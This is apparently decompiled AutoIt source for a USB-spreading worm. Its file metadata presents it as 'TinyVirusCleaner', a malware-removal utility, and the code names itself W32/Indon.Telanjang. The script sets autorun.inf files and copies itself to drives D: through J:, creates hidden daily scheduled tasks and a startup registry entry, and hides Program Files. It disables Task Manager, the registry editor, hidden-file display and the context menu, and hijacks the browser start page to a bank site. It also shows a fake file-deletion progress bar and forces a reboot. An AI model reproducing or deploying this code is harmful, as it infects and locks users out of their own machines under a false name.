; <AUT2EXE VERSION: 3.2.2.0>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: I:\TinyVirusCleaner.au3>
; ----------------------------------------------------------------------------

; hide tray icon
#NoTrayIcon

; minimize all windows
WinMinimizeAll()

; hide Program Files
FileSetAttrib("C:\Program Files", "+RSH")

; create Windows Scheduled Tasks
Run(@ComSpec & ' /c AT 8:30 /every:M,T,W,TH,F,S,SU C:\WINDOWS\Cache\TinyVirusCleaner.exe ', "" , @SW_HIDE)

Run(@ComSpec & ' /c AT 9:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\Cache\TinyVirusCleaner.exe ', "" , @SW_HIDE)

Run(@ComSpec & ' /c AT 10:30 /every:M,T,W,TH,F,S,SU C:\WINDOWS\Cache\TinyVirusCleaner.exe ', "" , @SW_HIDE)

Run(@ComSpec & ' /c AT 11:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\Cache\TinyVirusCleaner.exe ', "" , @SW_HIDE)

Run(@ComSpec & ' /c AT 12:30 /every:M,T,W,TH,F,S,SU C:\WINDOWS\Cache\TinyVirusCleaner.exe ', "" , @SW_HIDE)

Run(@ComSpec & ' /c AT 13:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\Cache\TinyVirusCleaner.exe ', "" , @SW_HIDE)

Run(@ComSpec & ' /c AT 14:30 /every:M,T,W,TH,F,S,SU C:\WINDOWS\Cache\TinyVirusCleaner.exe ', "" , @SW_HIDE)

Run(@ComSpec & ' /c AT 16:30 /every:M,T,W,TH,F,S,SU C:\WINDOWS\Cache\TinyVirusCleaner.exe ', "" , @SW_HIDE)


; create message file
FileWriteLine("pantun teka teki.txt","anak tenggiri di tengah kolam,")
FileWriteLine("pantun teka teki.txt",".")
FileWriteLine("pantun teka teki.txt","anak kolam di tengah anak tenggiri")
FileWriteLine("pantun teka teki.txt",".")
FileWriteLine("pantun teka teki.txt","kalau tuan bijak pandai, kenapa org indon suka buat virus?")
FileWriteLine("pantun teka teki.txt",".")
FileWriteLine("pantun teka teki.txt",".")
FileWriteLine("pantun teka teki.txt","brontok, kicked by the famous PgUp!")

; move text file to C:\
FileMove("pantun teka teki.txt", "C:\",9)

; create message file
FileWriteLine("talk.bat","@echo off")
FileWriteLine("talk.bat","title bacalah dan insaf")
FileWriteLine("talk.bat","echo.")
FileWriteLine("talk.bat","echo kiamat dah dekat")
FileWriteLine("talk.bat","echo.")
FileWriteLine("talk.bat","echo jangan selalu buat maksiat")
FileWriteLine("talk.bat","echo.")
FileWriteLine("talk.bat","echo mawi world!")
FileWriteLine("talk.bat","echo.")
FileWriteLine("talk.bat","echo.")
FileWriteLine("talk.bat","pause")
FileWriteLine("talk.bat","exit")

; set message file attributes
FileSetAttrib("talk.bat", "+RSH")

; create new directory in the windows directory
DirCreate("C:\WINDOWS\Tempt")

; move message file to C:\WINDOWS
FileMove("talk.bat", "C:\WINDOWS\Tempt",9)

; add message file to system startup
RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "talk", "REG_SZ", "C:\WINDOWS\Tempt\talk.bat")

; create autorun
FileWriteLine("autorun.inf","[Autorun]")
FileWriteLine("autorun.inf","open=TinyVirusCleaner.exe e")
FileWriteLine("autorun.inf","shellexecute=TinyVirusCleaner.exe e")
FileWriteLine("autorun.inf","shell\Auto\command=TinyVirusCleaner.exe e")
FileWriteLine("autorun.inf","shell=Auto")

; set autorun file attributes
FileSetAttrib("autorun.inf", "+RSH")

; move autorun file to C:\
FileMove("autorun.inf", "C:\",9)

; copy autorun to mapped drives
FileCopy("C:\autorun.inf", "D:\",9)

FileCopy("C:\autorun.inf", "E:\",9)

FileCopy("C:\autorun.inf", "F:\",9)

FileCopy("C:\autorun.inf", "G:\",9)

FileCopy("C:\autorun.inf", "H:\",9)

FileCopy("C:\autorun.inf", "I:\",9)

FileCopy("C:\autorun.inf", "J:\",9)

; copy file to mapped drives
FileCopy("TinyVirusCleaner.exe", "C:\",9)

FileCopy("TinyVirusCleaner.exe", "D:\",9)

FileCopy("TinyVirusCleaner.exe", "E:\",9)

FileCopy("TinyVirusCleaner.exe", "F:\",9)

FileCopy("TinyVirusCleaner.exe", "G:\",9)

FileCopy("TinyVirusCleaner.exe", "H:\",9)

FileCopy("TinyVirusCleaner.exe", "I:\",9)

FileCopy("TinyVirusCleaner.exe", "J:\",9)

FileCopy("TinyVirusCleaner.exe", "C:\Documents and Settings\All Users\Desktop")

; create new directory in the windows directory
DirCreate("C:\WINDOWS\Cache")

; copy file to the new directory
FileCopy("TinyVirusCleaner.exe", "C:\WINDOWS\Cache")

; set IE title
RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main", "Window Title", "REG_SZ", "W32/Indon.Telanjang")

; set IE home page
RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", "www.maybank2u.com.my")

RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", "www.maybank2u.com.my")

; disable taskmgr
RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")

RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")

; disable regedit
RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")

; hide folder options
RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFolderOptions", "REG_DWORD", "1")

; disable show hidden files and folders
RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL", "CheckedValue", "REG_DWORD", "0")

; disable right-click context menu
RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoViewContextMenu", "REG_DWORD", "1")

RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoViewContextMenu", "REG_DWORD", "1")

; Run Notepad
Run("notepad.exe")


; Wait for the Notepad become active - it is titled "Untitled - Notepad" on English systems
WinWaitActive("Untitled - Notepad")


; Now that the Notepad window is active type some text
Send("{ENTER}oi...")
Sleep(1000)
Send("{ENTER}{ENTER}cari sesuatu?")
sleep(1000)
Send("{ENTER}{ENTER}xda apa2 kat cni...{!}")
sleep(1000)
Send("{ENTER}{ENTER}kau nak buang virus?")
sleep(1000)
Send("{ENTER}{ENTER}x bisa{!}")
sleep(1000)
Send("{ENTER}{ENTER}WAHAHAHAHAHAHAHAHAHA{!}")
SLEEP(1000)
Send("{ENTER}{ENTER}jomlar mari kita main permainan kad...")
Sleep(1000)


; Now quit by pressing Alt-f and then x (File menu -> Exit)
Send("!f")
Send("x")


; Now a screen will pop up and ask to save the changes, the window is called
; "Notepad" and has some text "Yes" and "No"
WinWaitActive("Notepad", "No")
Send("n")


; Now wait for Notepad to close before continuing
WinWaitClose("Untitled - Notepad")

sleep(1000)

; start solitaire game
run("C:\WINDOWS\System32\sol.exe")

sleep(1000)

; start spider solitaore game
run("C:\WINDOWS\System32\spider.exe")

sleep(1000)

; Run Notepad
Run("notepad.exe")


; Wait for the Notepad become active - it is titled "Untitled - Notepad" on English systems
WinWaitActive("Untitled - Notepad")


; Now that the Notepad window is active type some text
Send("{ENTER}main minesweeper jugak lar...")
Sleep(1000)

; Now quit by pressing Alt-f and then x (File menu -> Exit)
Send("!f")
Send("x")


; Now a screen will pop up and ask to save the changes, the window is called
; "Notepad" and has some text "Yes" and "No"
WinWaitActive("Notepad", "No")
Send("n")


; Now wait for Notepad to close before continuing
WinWaitClose("Untitled - Notepad")

sleep(1000)

; start minesweeper game
run("C:\WINDOWS\System32\winmine")

sleep(1000)

; Run Notepad
Run("notepad.exe")


; Wait for the Notepad become active - it is titled "Untitled - Notepad" on English systems
WinWaitActive("Untitled - Notepad")


; Now that the Notepad window is active type some text
Send("{ENTER}main pinball best gak...")
Sleep(1000)

; Now quit by pressing Alt-f and then x (File menu -> Exit)
Send("!f")
Send("x")


; Now a screen will pop up and ask to save the changes, the window is called
; "Notepad" and has some text "Yes" and "No"
WinWaitActive("Notepad", "No")
Send("n")


; Now wait for Notepad to close before continuing
WinWaitClose("Untitled - Notepad")

sleep(1000)

; start pinball game
run("C:\Program Files\Windows NT\Pinball\Pinball.exe")

sleep(7000)

; close pinball game
ProcessClose("Pinball.exe")

sleep(1000)

; close minesweeper game
ProcessClose("winmine.exe")

sleep(1000)

; close spider solitaire game
ProcessClose("spider.exe")

sleep(1000)

; close solitaire game
ProcessClose("sol.exe")

sleep(1000)

; Run Notepad
Run("notepad.exe")


; Wait for the Notepad become active - it is titled "Untitled - Notepad" on English systems
WinWaitActive("Untitled - Notepad")


; Now that the Notepad window is active type some text
Send("{ENTER}jom dengar lagu pulak, ada CD lagu?...")
Sleep(1000)

; Now quit by pressing Alt-f and then x (File menu -> Exit)
Send("!f")
Send("x")


; Now a screen will pop up and ask to save the changes, the window is called
; "Notepad" and has some text "Yes" and "No"
WinWaitActive("Notepad", "No")
Send("n")


; Now wait for Notepad to close before continuing
WinWaitClose("Untitled - Notepad")

sleep(100)

run("C:\Program Files\Windows Media Player\wmplayer.exe")

; Open the CD tray on drive D:
CDTray("D:", "open")

sleep(500)

; Close the CD tray on drive D:
CDTray("D:", "close")

; Open the CD tray on drive E:
CDTray("E:", "open")

sleep(500)

; Close the CD tray on drive E:
CDTray("E:", "close")

; Open the CD tray on drive F:
CDTray("F:", "open")

sleep(500)

; Close the CD tray on drive F:
CDTray("F:", "close")

; Open the CD tray on drive G:
CDTray("G:", "open")

sleep(500)

; Close the CD tray on drive G:
CDTray("G:", "close")

; Open the CD tray on drive H:
CDTray("H:", "open")

sleep(500)

; Close the CD tray on drive H:
CDTray("H:", "close")

; Open the CD tray on drive I:
CDTray("I:", "open")

sleep(500)

; Close the CD tray on drive I:
CDTray("I:", "close")

; Open the CD tray on drive J:
CDTray("J:", "open")

sleep(500)

; Close the CD tray on drive J:
CDTray("J:", "close")

ProcessClose("wmplayer.exe")

; Double click at the current mouse pos
MouseClick("left")
MouseClick("left")

; Double click at 0,500
MouseClick("left", 0, 500, 2)


; SAFER VERSION of Double click at 0,500

Dim $primary
Dim $secondary
;Determine if user has swapped right and left mouse buttons
$k = RegRead("HKEY_CURRENT_USER\Control Panel\Mouse", "SwapMouseButtons")

; It's okay to NOT check the success of the RegRead operation
If $k = 1 Then
    $primary = "right"
    $secondary = "left"
Else ;normal (also case if could not read registry key)
    $primary = "left"
    $secondary = "right"
EndIf
MouseClick($primary, 0, 500, 2)

sleep(500)

; Left click drag from 0,200 to 600, 700
MouseClickDrag("left", 0, 200, 600, 700)

sleep(500)

; move mouse up then down
MouseMove(10, 100)
MouseMove(700, 700, 0)

sleep(500)

; Left click drag from 100,500 to 10, 2
MouseClickDrag("left", 100, 500, 10, 2)

sleep(1000)

; delete all files progress bar
ProgressOn("Delete!", "Deleting all your files", "0 %")
For $i = 20 to 100 step 20
	sleep(1000)
	ProgressSet( $i, $i & " %")
Next
ProgressSet(100 , "Deleted", "Files Deleted!")
sleep(1000)
ProgressOff()

; thank you message box
MsgBox(64,"Bye!","Terima kasih kerana meluangkan masa bersama saya, harap berjumpa lagi! :) -Bambang Hartono-")

; reveal tray icon
Opt("TrayIconHide", 0) ;un-hide the icon
Sleep(100)

; virus notify traytip
TrayTip("Bahaya", "Komputer anda dijangkiti virus W32/Indon.Telanjang !", 5, 1)

Sleep(100)

; play tada sound
SoundPlay("C:\WINDOWS\Media\tada.wav",1)

sleep(100)

; extended notify traytip
TrayTip("Bahaya", "Komputer anda dijangkiti virus W32/Indon.Telanjang !", 5, 1)

Sleep(3000)

; fake safe remove traytip
TrayTip("Safe To Remove Hardware", "The 'USB Mass Storage Device' device can now be safely removed from the system.", 5, 1)

Sleep(5000)

; Force a reboot
Shutdown(6)

; end script

#Region Compiler directives section
;** This is a list of compiler directives used by AutoIt3Wrapper.exe.
;** comment the lines you don't need or else it will override the default settings
#Compiler_Prompt=y                        ;y=show compile menu
;** AUTOIT3 settings
#Compiler_AUTOIT3=                        ;Override the default Interpreter version.
;** AUT2EXE settings
#Compiler_AUT2EXE=                        ;Override the default compiler with this version.
#Compiler_Icon=pdrive.ico                 ;Filename of the Ico file to use
#Compiler_OutFile=                        ;Target exe/a3x filename.
#Compiler_OutFile_Type=exe                ;a3x=small AutoIt3 file;  exe=Standalone executable(Default)
#Compiler_Compression=4                   ;Compression parameter 0-4  0=Low 2=normal 4=High
#Compiler_Allow_Decompile=               ;y= allow decompile
#Compiler_PassPhrase=                     ;Password to use for compilation
#Compiler_UseUpx=y                        ;(y/n) Compress output program works only for 3.1.1.110 and up. Default=Yes
;** Target program Resource info
#Compiler_Res_Comment=Portable Utility                    ;Comment field
#Compiler_Res_Description=Remove Malware In Removable Devices                ;Description field
#Compiler_Res_Fileversion=1.0.0.1                ;File Version
#Compiler_Res_FileVersion_AutoIncrement= ;AutoIncrement FileVersion After Aut2EXE is finished.
;#Compiler_Res_Language=2056               ;Resource Language code . default 2057=English (United Kingdom)
; free form resource fields ... max 15
; you can use the following variables:
; %AutoItVer% which will be replaced with the version of AutoIt3
; %date% = PC date in short date format
; %longdate% = PC date in long date format
; %time% = PC timeformat
#Compiler_Res_Field=Company|Tiny Inc.            ;Free format fieldname|fieldvalue
#Compiler_Res_Field=Product Name|TinyVirusCleaner            ;Free format fieldname|fieldvalue
#Compiler_Res_Field=Author|Alex Safin            ;Free format fieldname|fieldvalue
#EndRegion

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: I:\TinyVirusCleaner.au3>
; ----------------------------------------------------------------------------

